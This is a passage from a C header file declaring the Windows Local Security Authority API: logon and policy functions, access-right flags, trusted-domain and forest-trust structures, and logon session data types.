     POLICY_AUDIT_EVENT_UNCHANGED | \
     POLICY_AUDIT_EVENT_NONE)

#define LSA_SUCCESS(Error) ((LONG)(Error) >= 0)

NTSTATUS
NTAPI
LsaRegisterLogonProcess (
	IN PLSA_STRING LogonProcessName,
	OUT PHANDLE LsaHandle,
	OUT PLSA_OPERATIONAL_MODE SecurityMode
	);

NTSTATUS
NTAPI
LsaLogonUser (
	IN HANDLE LsaHandle,
	IN PLSA_STRING OriginName,
	IN SECURITY_LOGON_TYPE LogonType,
	IN ULONG AuthenticationPackage,
	IN PVOID AuthenticationInformation,
	IN ULONG AuthenticationInformationLength,
	IN OPTIONAL PTOKEN_GROUPS LocalGroups,
	IN PTOKEN_SOURCE SourceContext,
	OUT PVOID *ProfileBuffer,
	OUT PULONG ProfileBufferLength,
	OUT PLUID LogonId,
	OUT PHANDLE Token,
	OUT PQUOTA_LIMITS Quotas,
	OUT PNTSTATUS SubStatus
	);

NTSTATUS
NTAPI
LsaLookupAuthenticationPackage (
	IN HANDLE LsaHandle,
	IN PLSA_STRING PackageName,
	OUT PULONG AuthenticationPackage
	);

NTSTATUS
NTAPI
LsaFreeReturnBuffer (
	IN PVOID Buffer
	);

NTSTATUS
NTAPI
LsaCallAuthenticationPackage (
	IN HANDLE LsaHandle,
	IN ULONG AuthenticationPackage,
	IN PVOID ProtocolSubmitBuffer,
	IN ULONG SubmitBufferLength,
	OUT OPTIONAL PVOID *ProtocolReturnBuffer,
	OUT OPTIONAL PULONG ReturnBufferLength,
	OUT OPTIONAL PNTSTATUS ProtocolStatus
	);

NTSTATUS
NTAPI
LsaDeregisterLogonProcess (
	IN HANDLE LsaHandle
	);

NTSTATUS
NTAPI
LsaConnectUntrusted (
	OUT PHANDLE LsaHandle
	);

////////////////////////////////////////////////////////////////////////////
//                                                                        //
// Local Security Policy Administration API datatypes and defines         //
//                                                                        //
////////////////////////////////////////////////////////////////////////////

#define POLICY_VIEW_LOCAL_INFORMATION              0x00000001L
#define POLICY_VIEW_AUDIT_INFORMATION              0x00000002L
#define POLICY_GET_PRIVATE_INFORMATION             0x00000004L
#define POLICY_TRUST_ADMIN                         0x00000008L
#define POLICY_CREATE_ACCOUNT                      0x00000010L
#define POLICY_CREATE_SECRET                       0x00000020L
#define POLICY_CREATE_PRIVILEGE                    0x00000040L
#define POLICY_SET_DEFAULT_QUOTA_LIMITS            0x00000080L
#define POLICY_SET_AUDIT_REQUIREMENTS              0x00000100L
#define POLICY_AUDIT_LOG_ADMIN                     0x00000200L
#define POLICY_SERVER_ADMIN                        0x00000400L
#define POLICY_LOOKUP_NAMES                        0x00000800L
#define POLICY_NOTIFICATION                        0x00001000L

#define POLICY_ALL_ACCESS     (STANDARD_RIGHTS_REQUIRED         |\
                               POLICY_VIEW_LOCAL_INFORMATION    |\
                               POLICY_VIEW_AUDIT_INFORMATION    |\
                               POLICY_GET_PRIVATE_INFORMATION   |\
                               POLICY_TRUST_ADMIN               |\
                               POLICY_CREATE_ACCOUNT            |\
                               POLICY_CREATE_SECRET             |\
                               POLICY_CREATE_PRIVILEGE          |\
                               POLICY_SET_DEFAULT_QUOTA_LIMITS  |\
                               POLICY_SET_AUDIT_REQUIREMENTS    |\
                               POLICY_AUDIT_LOG_ADMIN           |\
                               POLICY_SERVER_ADMIN              |\
                               POLICY_LOOKUP_NAMES)


#define POLICY_READ           (STANDARD_RIGHTS_READ             |\
                               POLICY_VIEW_AUDIT_INFORMATION    |\
                               POLICY_GET_PRIVATE_INFORMATION)

#define POLICY_WRITE          (STANDARD_RIGHTS_WRITE            |\
                               POLICY_TRUST_ADMIN               |\
                               POLICY_CREATE_ACCOUNT            |\
                               POLICY_CREATE_SECRET             |\
                               POLICY_CREATE_PRIVILEGE          |\
                               POLICY_SET_DEFAULT_QUOTA_LIMITS  |\
                               POLICY_SET_AUDIT_REQUIREMENTS    |\
                               POLICY_AUDIT_LOG_ADMIN           |\
                               POLICY_SERVER_ADMIN)

#define POLICY_EXECUTE        (STANDARD_RIGHTS_EXECUTE          |\
                               POLICY_VIEW_LOCAL_INFORMATION    |\
                               POLICY_LOOKUP_NAMES)

typedef struct _LSA_TRANSLATED_SID {

    SID_NAME_USE Use;
    ULONG RelativeId;
    LONG DomainIndex;

} LSA_TRANSLATED_SID, *PLSA_TRANSLATED_SID;

typedef enum _POLICY_LSA_SERVER_ROLE {

    PolicyServerRoleBackup = 2,
    PolicyServerRolePrimary

} POLICY_LSA_SERVER_ROLE, *PPOLICY_LSA_SERVER_ROLE;

#if (_WIN32_WINNT < 0x0502)

typedef enum _POLICY_SERVER_ENABLE_STATE {

    PolicyServerEnabled = 2,
    PolicyServerDisabled

} POLICY_SERVER_ENABLE_STATE, *PPOLICY_SERVER_ENABLE_STATE;
#endif

typedef ULONG POLICY_AUDIT_EVENT_OPTIONS, *PPOLICY_AUDIT_EVENT_OPTIONS;

typedef enum _POLICY_INFORMATION_CLASS {

    PolicyAuditLogInformation = 1,
    PolicyAuditEventsInformation,
    PolicyPrimaryDomainInformation,
    PolicyPdAccountInformation,
    PolicyAccountDomainInformation,
    PolicyLsaServerRoleInformation,
    PolicyReplicaSourceInformation,
    PolicyDefaultQuotaInformation,
    PolicyModificationInformation,
    PolicyAuditFullSetInformation,
    PolicyAuditFullQueryInformation,
    PolicyDnsDomainInformation,
    PolicyDnsDomainInformationInt,
    PolicyLocalAccountDomainInformation,
    PolicyLastEntry

} POLICY_INFORMATION_CLASS, *PPOLICY_INFORMATION_CLASS;

typedef struct _POLICY_AUDIT_LOG_INFO {

    ULONG AuditLogPercentFull;
    ULONG MaximumLogSize;
    LARGE_INTEGER AuditRetentionPeriod;
    BOOLEAN AuditLogFullShutdownInProgress;
    LARGE_INTEGER TimeToShutdown;
    ULONG NextAuditRecordId;

} POLICY_AUDIT_LOG_INFO, *PPOLICY_AUDIT_LOG_INFO;

typedef struct _POLICY_AUDIT_EVENTS_INFO {

    BOOLEAN AuditingMode;
    PPOLICY_AUDIT_EVENT_OPTIONS EventAuditingOptions;
    ULONG MaximumAuditEventCount;

} POLICY_AUDIT_EVENTS_INFO, *PPOLICY_AUDIT_EVENTS_INFO;

typedef struct _POLICY_AUDIT_SUBCATEGORIES_INFO {

    ULONG MaximumSubCategoryCount;
    PPOLICY_AUDIT_EVENT_OPTIONS EventAuditingOptions;

} POLICY_AUDIT_SUBCATEGORIES_INFO, *PPOLICY_AUDIT_SUBCATEGORIES_INFO;

typedef struct _POLICY_AUDIT_CATEGORIES_INFO {

    ULONG MaximumCategoryCount;
    PPOLICY_AUDIT_SUBCATEGORIES_INFO SubCategoriesInfo;

} POLICY_AUDIT_CATEGORIES_INFO, *PPOLICY_AUDIT_CATEGORIES_INFO;

//
// Valid bits for Per user policy mask.
//

#define PER_USER_POLICY_UNCHANGED               (0x00)
#define PER_USER_AUDIT_SUCCESS_INCLUDE          (0x01)
#define PER_USER_AUDIT_SUCCESS_EXCLUDE          (0x02)
#define PER_USER_AUDIT_FAILURE_INCLUDE          (0x04)
#define PER_USER_AUDIT_FAILURE_EXCLUDE          (0x08)
#define PER_USER_AUDIT_NONE                     (0x10)


#define VALID_PER_USER_AUDIT_POLICY_FLAG (PER_USER_AUDIT_SUCCESS_INCLUDE | \
                                          PER_USER_AUDIT_SUCCESS_EXCLUDE | \
                                          PER_USER_AUDIT_FAILURE_INCLUDE | \
                                          PER_USER_AUDIT_FAILURE_EXCLUDE | \
                                          PER_USER_AUDIT_NONE)

typedef struct _POLICY_PRIMARY_DOMAIN_INFO {

    LSA_UNICODE_STRING Name;
    PSID Sid;

} POLICY_PRIMARY_DOMAIN_INFO, *PPOLICY_PRIMARY_DOMAIN_INFO;

typedef struct _POLICY_PD_ACCOUNT_INFO {

    LSA_UNICODE_STRING Name;

} POLICY_PD_ACCOUNT_INFO, *PPOLICY_PD_ACCOUNT_INFO;

typedef struct _POLICY_LSA_SERVER_ROLE_INFO {

    POLICY_LSA_SERVER_ROLE LsaServerRole;

} POLICY_LSA_SERVER_ROLE_INFO, *PPOLICY_LSA_SERVER_ROLE_INFO;

typedef struct _POLICY_REPLICA_SOURCE_INFO {

    LSA_UNICODE_STRING ReplicaSource;
    LSA_UNICODE_STRING ReplicaAccountName;

} POLICY_REPLICA_SOURCE_INFO, *PPOLICY_REPLICA_SOURCE_INFO;

typedef struct _POLICY_DEFAULT_QUOTA_INFO {

    QUOTA_LIMITS QuotaLimits;

} POLICY_DEFAULT_QUOTA_INFO, *PPOLICY_DEFAULT_QUOTA_INFO;


typedef struct _POLICY_MODIFICATION_INFO {

    LARGE_INTEGER ModifiedId;
    LARGE_INTEGER DatabaseCreationTime;

} POLICY_MODIFICATION_INFO, *PPOLICY_MODIFICATION_INFO;


typedef struct _POLICY_AUDIT_FULL_SET_INFO {

    BOOLEAN ShutDownOnFull;

} POLICY_AUDIT_FULL_SET_INFO, *PPOLICY_AUDIT_FULL_SET_INFO;


typedef struct _POLICY_AUDIT_FULL_QUERY_INFO {

    BOOLEAN ShutDownOnFull;
    BOOLEAN LogIsFull;

} POLICY_AUDIT_FULL_QUERY_INFO, *PPOLICY_AUDIT_FULL_QUERY_INFO;


typedef enum _POLICY_DOMAIN_INFORMATION_CLASS {

#if (_WIN32_WINNT <= 0x0500)
    PolicyDomainQualityOfServiceInformation = 1,
#endif
    PolicyDomainEfsInformation = 2,
    PolicyDomainKerberosTicketInformation

} POLICY_DOMAIN_INFORMATION_CLASS, *PPOLICY_DOMAIN_INFORMATION_CLASS;

#if (_WIN32_WINNT < 0x0502)

#define POLICY_QOS_SCHANNEL_REQUIRED            0x00000001
#define POLICY_QOS_OUTBOUND_INTEGRITY           0x00000002
#define POLICY_QOS_OUTBOUND_CONFIDENTIALITY     0x00000004
#define POLICY_QOS_INBOUND_INTEGRITY            0x00000008
#define POLICY_QOS_INBOUND_CONFIDENTIALITY      0x00000010
#define POLICY_QOS_ALLOW_LOCAL_ROOT_CERT_STORE  0x00000020
#define POLICY_QOS_RAS_SERVER_ALLOWED           0x00000040
#define POLICY_QOS_DHCP_SERVER_ALLOWED          0x00000080

//
// Bits 0x00000100 through 0xFFFFFFFF are reserved for future use.
//
#endif

#if (_WIN32_WINNT == 0x0500)
typedef struct _POLICY_DOMAIN_QUALITY_OF_SERVICE_INFO {

    ULONG QualityOfService;

} POLICY_DOMAIN_QUALITY_OF_SERVICE_INFO, *PPOLICY_DOMAIN_QUALITY_OF_SERVICE_INFO;

#endif

typedef struct _POLICY_DOMAIN_EFS_INFO {

    ULONG   InfoLength;
    PUCHAR  EfsBlob;

} POLICY_DOMAIN_EFS_INFO, *PPOLICY_DOMAIN_EFS_INFO;

#define POLICY_KERBEROS_VALIDATE_CLIENT 0x00000080

typedef struct _POLICY_DOMAIN_KERBEROS_TICKET_INFO {

    ULONG AuthenticationOptions;
    LARGE_INTEGER MaxServiceTicketAge;
    LARGE_INTEGER MaxTicketAge;
    LARGE_INTEGER MaxRenewAge;
    LARGE_INTEGER MaxClockSkew;
    LARGE_INTEGER Reserved;
} POLICY_DOMAIN_KERBEROS_TICKET_INFO, *PPOLICY_DOMAIN_KERBEROS_TICKET_INFO;

typedef enum _POLICY_NOTIFICATION_INFORMATION_CLASS {

    PolicyNotifyAuditEventsInformation = 1,
    PolicyNotifyAccountDomainInformation,
    PolicyNotifyServerRoleInformation,
    PolicyNotifyDnsDomainInformation,
    PolicyNotifyDomainEfsInformation,
    PolicyNotifyDomainKerberosTicketInformation,
    PolicyNotifyMachineAccountPasswordInformation,
    PolicyNotifyGlobalSaclInformation,
    PolicyNotifyMax // must always be the last entry

} POLICY_NOTIFICATION_INFORMATION_CLASS, *PPOLICY_NOTIFICATION_INFORMATION_CLASS;

typedef PVOID LSA_HANDLE, *PLSA_HANDLE;

typedef enum _TRUSTED_INFORMATION_CLASS {

    TrustedDomainNameInformation = 1,
    TrustedControllersInformation,
    TrustedPosixOffsetInformation,
    TrustedPasswordInformation,
    TrustedDomainInformationBasic,
    TrustedDomainInformationEx,
    TrustedDomainAuthInformation,
    TrustedDomainFullInformation,
    TrustedDomainAuthInformationInternal,
    TrustedDomainFullInformationInternal,
    TrustedDomainInformationEx2Internal,
    TrustedDomainFullInformation2Internal,
    TrustedDomainSupportedEncryptionTypes,
} TRUSTED_INFORMATION_CLASS, *PTRUSTED_INFORMATION_CLASS;

typedef struct _TRUSTED_DOMAIN_NAME_INFO {

    LSA_UNICODE_STRING Name;

} TRUSTED_DOMAIN_NAME_INFO, *PTRUSTED_DOMAIN_NAME_INFO;

typedef struct _TRUSTED_CONTROLLERS_INFO {

    ULONG Entries;
    PLSA_UNICODE_STRING Names;

} TRUSTED_CONTROLLERS_INFO, *PTRUSTED_CONTROLLERS_INFO;

typedef struct _TRUSTED_POSIX_OFFSET_INFO {

    ULONG Offset;

} TRUSTED_POSIX_OFFSET_INFO, *PTRUSTED_POSIX_OFFSET_INFO;

typedef struct _TRUSTED_PASSWORD_INFO {
    LSA_UNICODE_STRING Password;
    LSA_UNICODE_STRING OldPassword;
} TRUSTED_PASSWORD_INFO, *PTRUSTED_PASSWORD_INFO;

typedef  LSA_TRUST_INFORMATION TRUSTED_DOMAIN_INFORMATION_BASIC;
typedef PLSA_TRUST_INFORMATION PTRUSTED_DOMAIN_INFORMATION_BASIC;

#define TRUST_DIRECTION_DISABLED        0x00000000
#define TRUST_DIRECTION_INBOUND         0x00000001
#define TRUST_DIRECTION_OUTBOUND        0x00000002
#define TRUST_DIRECTION_BIDIRECTIONAL   (TRUST_DIRECTION_INBOUND | TRUST_DIRECTION_OUTBOUND)

#define TRUST_TYPE_DOWNLEVEL            0x00000001  // NT4 and before
#define TRUST_TYPE_UPLEVEL              0x00000002  // NT5
#define TRUST_TYPE_MIT                  0x00000003  // Trust with a MIT Kerberos realm

#if (_WIN32_WINNT < 0x0502)
#define TRUST_TYPE_DCE                  0x00000004  // Trust with a DCE realm
#endif

// Levels 0x5 - 0x000FFFFF reserved for future use
// Provider specific trust levels are from 0x00100000 to 0xFFF00000

#define TRUST_ATTRIBUTE_NON_TRANSITIVE                0x00000001  // Disallow transitivity
#define TRUST_ATTRIBUTE_UPLEVEL_ONLY                  0x00000002  // Trust link only valid for uplevel client
#if (_WIN32_WINNT == 0x0500)
#define TRUST_ATTRIBUTE_TREE_PARENT     0x00400000  // Denotes that we are setting the trust
                                                    // to our parent in the org tree...
#define TRUST_ATTRIBUTE_TREE_ROOT       0x00800000  // Denotes that we are setting the trust
                                                    // to another tree root in a forest...
// Trust attributes 0x00000004 through 0x004FFFFF reserved for future use
// Trust attributes 0x00F00000 through 0x00400000 are reserved for internal use
// Trust attributes 0x01000000 through 0xFF000000 are reserved for user
#define TRUST_ATTRIBUTES_VALID  0xFF02FFFF
#endif

#if (_WIN32_WINNT < 0x0502)
#define TRUST_ATTRIBUTE_FILTER_SIDS        0x00000004  // Used to quarantine domains
#else
#define TRUST_ATTRIBUTE_QUARANTINED_DOMAIN            0x00000004  // Used to quarantine domains
#endif

#if (_WIN32_WINNT >= 0x0501)
#define TRUST_ATTRIBUTE_FOREST_TRANSITIVE             0x00000008  // This link may contain forest trust information
#if (_WIN32_WINNT >= 0x0502)
#define TRUST_ATTRIBUTE_CROSS_ORGANIZATION            0x00000010  // This trust is to a domain/forest which is not part of this enterprise
#define TRUST_ATTRIBUTE_WITHIN_FOREST                 0x00000020  // Trust is internal to this forest
#define TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL             0x00000040  // Trust is to be treated as external for trust boundary purposes
#if (_WIN32_WINNT >= 0x0600)
#define TRUST_ATTRIBUTE_TRUST_USES_RC4_ENCRYPTION     0x00000080  // MIT trust with RC4
#define TRUST_ATTRIBUTE_TRUST_USES_AES_KEYS           0x00000100  // Use AES keys to encrypte KRB TGTs
#endif
// Trust attributes 0x00000040 through 0x00200000 are reserved for future use
#else
// Trust attributes 0x00000010 through 0x00200000 are reserved for future use
#endif
// Trust attributes 0x00400000 through 0x00800000 were used previously (up to W2K) and should not be re-used
// Trust attributes 0x01000000 through 0x80000000 are reserved for user
#define TRUST_ATTRIBUTES_VALID          0xFF03FFFF
#endif
#define TRUST_ATTRIBUTES_USER           0xFF000000

typedef struct _TRUSTED_DOMAIN_INFORMATION_EX {

    LSA_UNICODE_STRING Name;
    LSA_UNICODE_STRING FlatName;
    PSID  Sid;
    ULONG TrustDirection;
    ULONG TrustType;
    ULONG TrustAttributes;

} TRUSTED_DOMAIN_INFORMATION_EX, *PTRUSTED_DOMAIN_INFORMATION_EX;

typedef struct _TRUSTED_DOMAIN_INFORMATION_EX2 {

    LSA_UNICODE_STRING Name;
    LSA_UNICODE_STRING FlatName;
    PSID  Sid;
    ULONG TrustDirection;
    ULONG TrustType;
    ULONG TrustAttributes;
    ULONG ForestTrustLength;
#ifdef MIDL_PASS
    [size_is( ForestTrustLength )]
#endif
    PUCHAR ForestTrustInfo;

} TRUSTED_DOMAIN_INFORMATION_EX2, *PTRUSTED_DOMAIN_INFORMATION_EX2;

#define TRUST_AUTH_TYPE_NONE    0   // Ignore this entry
#define TRUST_AUTH_TYPE_NT4OWF  1   // NT4 OWF password
#define TRUST_AUTH_TYPE_CLEAR   2   // Cleartext password
#define TRUST_AUTH_TYPE_VERSION 3   // Cleartext password version number

typedef struct _LSA_AUTH_INFORMATION {

    LARGE_INTEGER LastUpdateTime;
    ULONG AuthType;
    ULONG AuthInfoLength;
    PUCHAR AuthInfo;
} LSA_AUTH_INFORMATION, *PLSA_AUTH_INFORMATION;

typedef struct _TRUSTED_DOMAIN_AUTH_INFORMATION {

    ULONG IncomingAuthInfos;
    PLSA_AUTH_INFORMATION   IncomingAuthenticationInformation;
    PLSA_AUTH_INFORMATION   IncomingPreviousAuthenticationInformation;
    ULONG OutgoingAuthInfos;
    PLSA_AUTH_INFORMATION   OutgoingAuthenticationInformation;
    PLSA_AUTH_INFORMATION   OutgoingPreviousAuthenticationInformation;

} TRUSTED_DOMAIN_AUTH_INFORMATION, *PTRUSTED_DOMAIN_AUTH_INFORMATION;

typedef struct _TRUSTED_DOMAIN_FULL_INFORMATION {

    TRUSTED_DOMAIN_INFORMATION_EX   Information;
    TRUSTED_POSIX_OFFSET_INFO       PosixOffset;
    TRUSTED_DOMAIN_AUTH_INFORMATION AuthInformation;

} TRUSTED_DOMAIN_FULL_INFORMATION, *PTRUSTED_DOMAIN_FULL_INFORMATION;

typedef struct _TRUSTED_DOMAIN_FULL_INFORMATION2 {

    TRUSTED_DOMAIN_INFORMATION_EX2  Information;
    TRUSTED_POSIX_OFFSET_INFO       PosixOffset;
    TRUSTED_DOMAIN_AUTH_INFORMATION AuthInformation;

} TRUSTED_DOMAIN_FULL_INFORMATION2, *PTRUSTED_DOMAIN_FULL_INFORMATION2;

typedef struct _TRUSTED_DOMAIN_SUPPORTED_ENCRYPTION_TYPES {

	ULONG SupportedEncryptionTypes;

} TRUSTED_DOMAIN_SUPPORTED_ENCRYPTION_TYPES, *PTRUSTED_DOMAIN_SUPPORTED_ENCRYPTION_TYPES;

typedef enum {

    ForestTrustTopLevelName,
    ForestTrustTopLevelNameEx,
    ForestTrustDomainInfo,
    ForestTrustRecordTypeLast = ForestTrustDomainInfo

} LSA_FOREST_TRUST_RECORD_TYPE;

#if (_WIN32_WINNT < 0x0502)
#define LSA_FOREST_TRUST_RECORD_TYPE_UNRECOGNIZED 0x80000000
#endif

//
// Bottom 16 bits of the flags are reserved for disablement reasons
//

#define LSA_FTRECORD_DISABLED_REASONS            ( 0x0000FFFFL )

//
// Reasons for a top-level name forest trust record to be disabled
//

#define LSA_TLN_DISABLED_NEW                     ( 0x00000001L )
#define LSA_TLN_DISABLED_ADMIN                   ( 0x00000002L )
#define LSA_TLN_DISABLED_CONFLICT                ( 0x00000004L )

//
// Reasons for a domain information forest trust record to be disabled
//

#define LSA_SID_DISABLED_ADMIN                   ( 0x00000001L )
#define LSA_SID_DISABLED_CONFLICT                ( 0x00000002L )
#define LSA_NB_DISABLED_ADMIN                    ( 0x00000004L )
#define LSA_NB_DISABLED_CONFLICT                 ( 0x00000008L )

typedef struct _LSA_FOREST_TRUST_DOMAIN_INFO {

#ifdef MIDL_PASS
    PISID Sid;
#else
    PSID Sid;
#endif
    LSA_UNICODE_STRING DnsName;
    LSA_UNICODE_STRING NetbiosName;

} LSA_FOREST_TRUST_DOMAIN_INFO, *PLSA_FOREST_TRUST_DOMAIN_INFO;


#if (_WIN32_WINNT >= 0x0502)
//
//  To prevent huge data to be passed in, we should put a limit on LSA_FOREST_TRUST_BINARY_DATA.
//      128K is large enough that can't be reached in the near future, and small enough not to
//      cause memory problems.

#define MAX_FOREST_TRUST_BINARY_DATA_SIZE ( 128 * 1024 )
#endif

typedef struct _LSA_FOREST_TRUST_BINARY_DATA {

#ifdef MIDL_PASS
    [range(0, MAX_FOREST_TRUST_BINARY_DATA_SIZE)] ULONG Length;
    [size_is( Length )] PUCHAR Buffer;
#else
    ULONG Length;
    PUCHAR Buffer;
#endif

} LSA_FOREST_TRUST_BINARY_DATA, *PLSA_FOREST_TRUST_BINARY_DATA;

typedef struct _LSA_FOREST_TRUST_RECORD {

    ULONG Flags;
    LSA_FOREST_TRUST_RECORD_TYPE ForestTrustType; // type of record
    LARGE_INTEGER Time;

#ifdef MIDL_PASS
    [switch_type( LSA_FOREST_TRUST_RECORD_TYPE ), switch_is( ForestTrustType )]
#endif

    union {                                       // actual data

#ifdef MIDL_PASS
        [case( ForestTrustTopLevelName,
               ForestTrustTopLevelNameEx )] LSA_UNICODE_STRING TopLevelName;
        [case( ForestTrustDomainInfo )] LSA_FOREST_TRUST_DOMAIN_INFO DomainInfo;
        [default] LSA_FOREST_TRUST_BINARY_DATA Data;
#else
        LSA_UNICODE_STRING TopLevelName;
        LSA_FOREST_TRUST_DOMAIN_INFO DomainInfo;
        LSA_FOREST_TRUST_BINARY_DATA Data;        // used for unrecognized types
#endif
    } ForestTrustData;

} LSA_FOREST_TRUST_RECORD, *PLSA_FOREST_TRUST_RECORD;

#if (_WIN32_WINNT >= 0x0502)
//
// To prevent forest trust blobs of large size, number of records must be
// smaller than MAX_RECORDS_IN_FOREST_TRUST_INFO
//

#define MAX_RECORDS_IN_FOREST_TRUST_INFO 4000
#endif

typedef struct _LSA_FOREST_TRUST_INFORMATION {

#ifdef MIDL_PASS
    [range(0, MAX_RECORDS_IN_FOREST_TRUST_INFO)] ULONG RecordCount;
    [size_is( RecordCount )] PLSA_FOREST_TRUST_RECORD * Entries;
#else
    ULONG RecordCount;
    PLSA_FOREST_TRUST_RECORD * Entries;
#endif

} LSA_FOREST_TRUST_INFORMATION, *PLSA_FOREST_TRUST_INFORMATION;

typedef enum {

    CollisionTdo,
    CollisionXref,
    CollisionOther

} LSA_FOREST_TRUST_COLLISION_RECORD_TYPE;

typedef struct _LSA_FOREST_TRUST_COLLISION_RECORD {

    ULONG Index;
    LSA_FOREST_TRUST_COLLISION_RECORD_TYPE Type;
    ULONG Flags;
    LSA_UNICODE_STRING Name;

} LSA_FOREST_TRUST_COLLISION_RECORD, *PLSA_FOREST_TRUST_COLLISION_RECORD;

typedef struct _LSA_FOREST_TRUST_COLLISION_INFORMATION {

    ULONG RecordCount;
#ifdef MIDL_PASS
    [size_is( RecordCount )]
#endif
    PLSA_FOREST_TRUST_COLLISION_RECORD * Entries;

} LSA_FOREST_TRUST_COLLISION_INFORMATION, *PLSA_FOREST_TRUST_COLLISION_INFORMATION;


//
// LSA Enumeration Context
//

typedef ULONG LSA_ENUMERATION_HANDLE, *PLSA_ENUMERATION_HANDLE;

//
// LSA Enumeration Information
//

typedef struct _LSA_ENUMERATION_INFORMATION {

    PSID Sid;

} LSA_ENUMERATION_INFORMATION, *PLSA_ENUMERATION_INFORMATION;


////////////////////////////////////////////////////////////////////////////
//                                                                        //
// Local Security Policy - Miscellaneous API function prototypes          //
//                                                                        //
////////////////////////////////////////////////////////////////////////////


NTSTATUS
NTAPI
LsaFreeMemory(
	IN OPTIONAL PVOID Buffer
	);

NTSTATUS
NTAPI
LsaClose(
	IN LSA_HANDLE ObjectHandle
	);

#if (_WIN32_WINNT >= 0x0600)

typedef struct _LSA_LAST_INTER_LOGON_INFO {
    LARGE_INTEGER LastSuccessfulLogon;
    LARGE_INTEGER LastFailedLogon;
    ULONG FailedAttemptCountSinceLastSuccessfulLogon;
} LSA_LAST_INTER_LOGON_INFO, *PLSA_LAST_INTER_LOGON_INFO;

#endif

#if (_WIN32_WINNT >= 0x0501)
typedef struct _SECURITY_LOGON_SESSION_DATA {
    ULONG               Size;
    LUID                LogonId;
    LSA_UNICODE_STRING  UserName;
    LSA_UNICODE_STRING  LogonDomain;
    LSA_UNICODE_STRING  AuthenticationPackage;
    ULONG               LogonType;
    ULONG               Session;
    PSID                Sid;
    LARGE_INTEGER       LogonTime;

    LSA_UNICODE_STRING  LogonServer;
    LSA_UNICODE_STRING  DnsDomainName;
    LSA_UNICODE_STRING  Upn;

#if (_WIN32_WINNT >= 0x0600)

    ULONG UserFlags;

    LSA_LAST_INTER_LOGON_INFO LastLogonInfo;
    LSA_UNICODE_STRING LogonScript;
    LSA_UNICODE_STRING ProfilePath;
    LSA_UNICODE_STRING HomeDirectory;
    LSA_UNICODE_STRING HomeDirectoryDrive;

    LARGE_INTEGER LogoffTime;
    LARGE_INTEGER KickOffTime;
    LARGE_INTEGER PasswordLastSet;
    LARGE_INTEGER PasswordCanChange;
    LARGE_INTEGER PasswordMustChange;

#endif
} SECURITY_LOGON_SESSION_DATA, * PSECURITY_LOGON_SESSION_DATA;

NTSTATUS
NTAPI
LsaEnumerateLogonSessions(
	OUT PULONG  LogonSessionCount,
	OUT PLUID * LogonSessionList
	);

NTSTATUS
NTAPI
LsaGetLogonSessionData(
	IN PLUID LogonId,
	OUT PSECURITY_LOGON_SESSION_DATA * ppLogonSessionData
	);

#endif
NTSTATUS
NTAPI
LsaOpenPolicy(
	IN OPTIONAL PLSA_UNICODE_STRING SystemName,
	IN PLSA_OBJECT_ATTRIBUTES ObjectAttributes,
	IN ACCESS_MASK DesiredAccess,
	OUT PLSA_HANDLE PolicyHandle
	);


NTSTATUS
NTAPI
LsaQueryInformationPolicy(
	IN LSA_HANDLE PolicyHandle,
	IN POLICY_INFORMATION_CLASS InformationClass,
	OUT PVOID *Buffer
	);

NTSTATUS
NTAPI
LsaSetInformationPolicy(
	IN LSA_HANDLE PolicyHandle,
	IN POLICY_INFORMATION_CLASS InformationClass,
	IN PVOID Buffer
	);

NTSTATUS
NTAPI
LsaQueryDomainInformationPolicy(
	IN LSA_HANDLE PolicyHandle,
	IN POLICY_DOMAIN_INFORMATION_CLASS InformationClass,
	OUT PVOID *Buffer
	);

NTSTATUS
NTAPI
LsaSetDomainInformationPolicy(
	IN LSA_HANDLE PolicyHandle,
	IN POLICY_DOMAIN_INFORMATION_CLASS InformationClass,
	IN OPTIONAL PVOID Buffer
	);

NTSTATUS
NTAPI
LsaRegisterPolicyChangeNotification(
	IN POLICY_NOTIFICATION_INFORMATION_CLASS InformationClass,
	IN HANDLE NotificationEventHandle
	);

NTSTATUS
NTAPI
LsaUnregisterPolicyChangeNotification(
	IN POLICY_NOTIFICATION_INFORMATION_CLASS InformationClass,
	IN HANDLE NotificationEventHandle
	);

NTSTATUS
NTAPI
LsaEnumerateTrustedDomains(
	IN LSA_HANDLE PolicyHandle,
	IN OUT PLSA_ENUMERATION_HANDLE EnumerationContext,
	OUT PVOID *Buffer,
	IN ULONG PreferedMaximumLength,
	OUT PULONG CountReturned
	);

NTSTATUS
NTAPI
LsaLookupNames(
	IN LSA_HANDLE PolicyHandle,
	IN ULONG Count,
	IN PLSA_UNICODE_STRING Names,
	OUT PLSA_REFERENCED_DOMAIN_LIST *ReferencedDomains,
	OUT PLSA_TRANSLATED_SID *Sids
	);

#if (_WIN32_WINNT >= 0x0501)
NTSTATUS
NTAPI
LsaLookupNames2(
	IN LSA_HANDLE PolicyHandle,
	IN ULONG Flags, // Reserved
	IN ULONG Count,
	IN PLSA_UNICODE_STRING Names,
	OUT PLSA_REFERENCED_DOMAIN_LIST *ReferencedDomains,
	OUT PLSA_TRANSLATED_SID2 *Sids
	);
#endif

NTSTATUS
NTAPI
LsaLookupSids(
	IN LSA_HANDLE PolicyHandle,
	IN ULONG Count,
	IN PSID *Sids,
	OUT PLSA_REFERENCED_DOMAIN_LIST *ReferencedDomains,
	OUT PLSA_TRANSLATED_NAME *Names
	);

#define SE_INTERACTIVE_LOGON_NAME           TEXT("SeInteractiveLogonRight")
#define SE_NETWORK_LOGON_NAME               TEXT("SeNetworkLogonRight")
#define SE_BATCH_LOGON_NAME                 TEXT("SeBatchLogonRight")
#define SE_SERVICE_LOGON_NAME               TEXT("SeServiceLogonRight")
#define SE_DENY_INTERACTIVE_LOGON_NAME      TEXT("SeDenyInteractiveLogonRight")
#define SE_DENY_NETWORK_LOGON_NAME          TEXT("SeDenyNetworkLogonRight")
#define SE_DENY_BATCH_LOGON_NAME            TEXT("SeDenyBatchLogonRight")
#define SE_DENY_SERVICE_LOGON_NAME          TEXT("SeDenyServiceLogonRight")
#if (_WIN32_WINNT >= 0x0501)
#define SE_REMOTE_INTERACTIVE_LOGON_NAME    TEXT("SeRemoteInteractiveLogonRight")
#define SE_DENY_REMOTE_INTERACTIVE_LOGON_NAME TEXT("SeDenyRemoteInteractiveLogonRight")
#endif

NTSTATUS
NTAPI
LsaEnumerateAccountsWithUserRight(
	IN LSA_HANDLE PolicyHandle,
	IN OPTIONAL PLSA_UNICODE_STRING UserRight,
	OUT PVOID *Buffer,
	OUT PULONG CountReturned
	);

NTSTATUS
NTAPI
LsaEnumerateAccountRights(
	IN LSA_HANDLE PolicyHandle,
	IN PSID AccountSid,
